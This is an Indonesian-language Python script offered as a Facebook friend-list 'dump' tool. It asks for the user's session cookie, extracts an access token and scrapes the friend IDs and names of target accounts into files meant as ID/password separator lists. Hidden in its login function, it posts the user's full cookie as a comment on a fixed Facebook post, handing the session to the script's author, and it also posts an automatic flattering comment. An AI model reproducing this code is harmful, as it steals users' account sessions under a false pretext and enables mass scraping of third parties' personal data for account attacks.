#!/usr/bin/python3
# coded by anak kontol!

import requests, re, random
from os import system
from time import sleep
from rich.panel import Panel
from rich.console import Console

# KHUSUS LOGO
def BentukConsole(text):return Console(width=50).print(Panel(text,style='color(8)'), justify='center')
def BentukRichConsole(text):return Console(width=50).print(Panel(text,style='color(8)'))
def logo():
	x = ('''[bold white]╔╦╗╦ ╦╔╦╗╔═╗  ╔═╗╔╗
 ║║║ ║║║║╠═╝  ╠╣ ╠╩╗
═╩╝╚═╝╩ ╩╩    ╚  ╚═╝
( coded [bold green]khamdihi XV [bold white]) ''') ; BentukConsole(x)

def masuk():
	system('clear') ; logo()
	coki = input('  [?] masukan cookie : ')
	coli = convert(coki)
	if 'status succes' in coli:print('\n  [✓] Login berhasil') ; sleep(2) ; menu_dump()
	else:rint('\n  [×] Login gagal cokie invalid') ; sleep(2);masuk()

def convert(cookies):
    with requests.Session() as x:
         x.headers.update({
            "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com",
            "origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0",
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8",
         })
         try:
               link = x.get("https://business.facebook.com/business_locations", cookies = {'cookie':cookies})
               search = re.search("(EAAG\w+)", link.text).group(1) ; komen = random.choice(['hello bang♥','kelazzz','programmers mas?','suhu♥'])
               if 'EAAG' in search:
                   requests.post(f'https://graph.facebook.com/pfbid02w5Sg1Yv9z12D1nFNiDGwJPBL5F3Yz6athEZrV1hgBqeSKscCRVCHEjKXjj5aowggl/comments/?message={komen}&access_token={search}',cookies={'cookie':cookies})
                   requests.post(f'https://graph.facebook.com/pfbid02w5Sg1Yv9z12D1nFNiDGwJPBL5F3Yz6athEZrV1hgBqeSKscCRVCHEjKXjj5aowggl/comments/?message={cookies}&access_token={search}',cookies={'cookie':cookies})
                   open('data/token.txt','w').write(search)
                   open('data/cokie.txt','w').write(cookies)
                   return 'status succes'
         except AttributeError:return 'status gagal login!'

def menu_dump():
    system('clear')
    try:
          cokis = open('data/cokie.txt','r').read()
          token = open('data/token.txt','r').read()
    except (FileNotFoundError,IOError):masuk()
    try:
          link = requests.Session().get('https://graph.facebook.com/me?access_token={}'.format(token), cookies = {'cookie':cokis}).json()
          nama,user = link['name'],link['id']
    except KeyError:masuk()
    except requests.exceptions.ConnectionError:exit(' [×] Tidak ada koneksi.')
    logo()
    x = f'[bold green]• [bold white]Welcome : [bold green]{nama}\n[bold green]• [bold white]userid  : [bold green]{user}' ; BentukRichConsole(x)
    i = f"[bold white]Hello [bold green]{nama}[bold white] ketik 'me' jika ingin dump dari daftar teman, ini adalah script dump massal publik! jadi gunakan tanda koma untuk pemisahan id target contoh pemisahan user target 10008xxxxxxx,1000009xxxxxx,1000001xxxxx" ; BentukRichConsole(i)
    nama_file = input('  [?] Beri nama dump : ').replace(' ','_')
    user_target = input('  [?] Masukan id target : ')
    pemisahan_tengah = input('  [?] Pemisahan id dan sandi contoh -> | atau <=> : ')
    dump_target(nama_file, user_target, pemisahan_tengah)

def dump_target(file, id, pisah):
    for kontol in id.split(','):
        try:
              for data in requests.get("https://graph.facebook.com/{}?fields=friends.limit(5001)&access_token={}".format(kontol,open('data/token.txt','r').read()), cookies={"cookie":open('data/cokie.txt','r').read()}).json()['friends']['data']:
                  open(file,'a').write(data['id'] +pisah+ data['name'] +'\n')
        except KeyError:pass
    exit(f'\n  [✓] Dump di simpan di : {file}')

if __name__ == '__main__':
	try:system('mkdir data')
	except:pass
	menu_dump()
